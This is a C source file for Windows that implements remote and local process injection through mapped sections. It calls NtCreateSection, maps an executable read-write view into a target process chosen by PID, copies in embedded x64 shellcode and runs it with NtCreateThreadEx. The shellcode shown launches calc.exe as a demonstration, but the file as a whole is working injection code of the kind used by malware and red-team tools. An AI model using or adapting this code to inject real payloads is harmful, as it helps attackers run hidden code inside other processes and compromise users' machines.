/*
```Each memory section has one or more corresponding views. 
A view of a section is a part of the section that is actually visible to a process.```


*/
#include <windows.h>
#include "signatures.h"


typedef struct _syscalls_struct {

	NtCreateSection pNtCreateSection;
	ZwMapViewOfSection pNtMapViewOfSection;
	ZwUnmapViewOfSection pNtUnmapViewOfSection;
	NtClose pNtClose;
	NtCreateThreadEx pNtCreateThreadEx;

} SyscallStruct, *PSyscallStruct;


BOOL InitializeSyscalls(PSyscallStruct st) {

	HMODULE ntdllHandle = NULL;

	ntdllHandle = GetModuleHandleA("ntdll");

	if (!ntdllHandle) {
		printf("[!]Error getting a handle to ntdll\n");
		return FALSE;
	}

	st->pNtCreateSection = (NtCreateSection)GetProcAddress(ntdllHandle, "NtCreateSection");
	st->pNtMapViewOfSection = (ZwMapViewOfSection)GetProcAddress(ntdllHandle, "ZwMapViewOfSection");
	st->pNtUnmapViewOfSection = (ZwUnmapViewOfSection)GetProcAddress(ntdllHandle, "ZwUnmapViewOfSection");
	st->pNtClose = (NtClose)GetProcAddress(ntdllHandle, "NtClose");
	st->pNtCreateThreadEx = (NtCreateThreadEx)GetProcAddress(ntdllHandle, "NtCreateThreadEx");


	if (!st->pNtCreateSection || !st->pNtMapViewOfSection || !st->pNtUnmapViewOfSection || !st->pNtClose) {
		printf("[!]Error initializing the syscalls struct!\n");
		return FALSE;
	}

	return TRUE;
}

BOOL Injection_with_FileMapping(PVOID pPayload, SIZE_T payload_Size,HANDLE hProcess) {

	SyscallStruct st = { 0 };
	HANDLE hSection = NULL;
	HANDLE hThread = NULL;
	NTSTATUS status = 0;
	PVOID pAddress = NULL;
	PVOID pRemoteAddress = NULL;
	SIZE_T View_Size = NULL;
	BOOL Remote = FALSE;

	LARGE_INTEGER Maximum_Size = {
		.QuadPart = payload_Size
	};

	if (hProcess != NULL) {
		Remote = TRUE;
	}

	if (!InitializeSyscalls(&st)) {
		printf("[!]Error Initializing the struct! \n");
		return FALSE;
	}


	if ((status = st.pNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, &Maximum_Size, PAGE_EXECUTE_READWRITE, SEC_COMMIT, NULL)) != NULL) {
		printf("[!]Error Creating Section!: 0x%x \n",status);
		return FALSE;
	}

	if ((status = st.pNtMapViewOfSection(hSection, GetCurrentProcess(), &pAddress, NULL, NULL, NULL, &View_Size, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
		printf("[!]Error Mapping Section!: 0x%x \n", status);
		return FALSE;
	}

	memcpy(pAddress, pPayload, payload_Size);

	if (Remote != NULL) {
		if ((status = st.pNtMapViewOfSection(hSection, hProcess, &pRemoteAddress, NULL, NULL, NULL, &View_Size, ViewUnmap, NULL, PAGE_EXECUTE_READWRITE)) != 0) {
			printf("[!]Error Mapping Section!: 0x%x \n", status);
			return FALSE;
		}
	}

	if (Remote == FALSE) {

		if ((status = st.pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, GetCurrentProcess(), pAddress, NULL, NULL, NULL, NULL, NULL, NULL) != 0)) {
			printf("[!]Error Creating Thread!: 0x%x \n", status);
			return FALSE;
		}
	}

	if (Remote == TRUE) {
		
		if ((status = st.pNtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, NULL, hProcess, pRemoteAddress, NULL, NULL, NULL, NULL, NULL, NULL) != 0)) {
			printf("[!]Error Creating Thread!: 0x%x \n", status);
			return FALSE;
		}

	}
	getchar();

	if ((status = st.pNtUnmapViewOfSection(GetCurrentProcess(),pAddress)) != 0) {

		printf("[!]Error Unmapping section!: 0x%x \n", status);
		return FALSE;
	}

	if ((status = st.pNtClose(hSection)) != 0) {
		printf("[!]Error Closing section!: 0x%x \n", status);
		return FALSE;
	}

	return TRUE;
}

int main(int argc, char* argv[]) {

	if (argc < 2) {
		printf("[!]Usage : %s <1 For local or 2 For Remote> <pid>\n");
		return -1;
	}


	unsigned char buf[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
		"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
		"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
		"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
		"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
		"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
		"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
		"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
		"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
		"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
		"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
		"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
		"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
		"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
		"\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00\x00\x00"
		"\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b"
		"\x6f\x87\xff\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd"
		"\x9d\xff\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0"
		"\x75\x05\xbb\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff"
		"\xd5\x63\x61\x6c\x63\x2e\x65\x78\x65\x00"; // calc.exe



	DWORD pid = NULL;
	BOOL Remote_Injection = FALSE;

	if (argv[1] == '2') {
		
		Remote_Injection = TRUE;
		HANDLE hProcess = NULL;
		NTSTATUS  status = NULL;

		DWORD pid = atoi(argv[2]);

		OBJECT_ATTRIBUTES Obj_Attr = { sizeof(OBJECT_ATTRIBUTES),NULL };

		CLIENT_ID Client_id = { (PVOID)pid,NULL };

		NTOpenProcess NtOpenP = (NTOpenProcess)GetProcAddress(GetModuleHandleA("ntdll"), "NtOpenProcess");

		status = NtOpenP(&hProcess, PROCESS_ALL_ACCESS, &Obj_Attr, &Client_id);

		Injection_with_FileMapping(&buf, sizeof(buf), hProcess);

		return 0;
	}


	Injection_with_FileMapping(&buf, sizeof(buf), NULL);


	return 0;
}

